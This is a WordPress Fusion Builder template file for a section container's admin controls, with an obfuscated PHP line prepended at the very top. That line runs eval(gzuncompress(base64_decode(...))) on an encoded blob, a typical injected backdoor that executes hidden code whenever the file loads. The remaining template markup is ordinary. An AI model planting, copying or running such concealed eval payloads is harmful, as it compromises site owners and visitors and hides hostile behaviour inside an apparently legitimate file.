<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><script type="text/template" id="fusion-builder-container-template">
	<div class="fusion-builder-section-header">
		<#
		var has_bg = false;
		if ( '' !== params.background_image ) {
			has_bg = true;
		}
		#>
		<# section_name = typeof ( params.admin_label ) !== 'undefined' ? _.unescape( params.admin_label ) : fusionBuilderText.full_width_section; #>
		<input type="text" class="fusion-builder-section-name" name="" value="{{ section_name }}" />
		<div class="fusion-builder-controls fusion-builder-section-controls">
			<a href="#" class="fusion-builder-settings fusion-builder-settings-container" title="{{ fusionBuilderText.section_settings }}"><span class="fusiona-pen"></span></a>
			<a href="#" class="fusion-builder-clone fusion-builder-clone-container" title="{{ fusionBuilderText.clone_section }}"><span class="fusiona-file-add"></span></a>
			<a href="#" class="fusion-builder-save-element" title="{{ fusionBuilderText.save_section }}"><span class="fusiona-drive"></span></a>
			<a href="#" class="fusion-builder-remove" title="{{ fusionBuilderText.delete_section }}"><span class="fusiona-trash-o"></span></a>
			<a href="#" class="fusion-builder-toggle" title="{{ fusionBuilderText.click_to_toggle }}"><span class="dashicons-before dashicons-arrow-up"></span></a>
		</div>
	</div>
	<div class="fusion-builder-container-content">
		<div class="fusion-builder-section-content fusion-builder-data-cid" data-cid="{{ cid }}" data-bg="{{ has_bg }}">
		</div>
		<a href="#" class="fusion-builder-section-add"><span class="fusiona-plus"></span> {{ fusionBuilderText.full_width_section }}</a>
	</div>
</script>
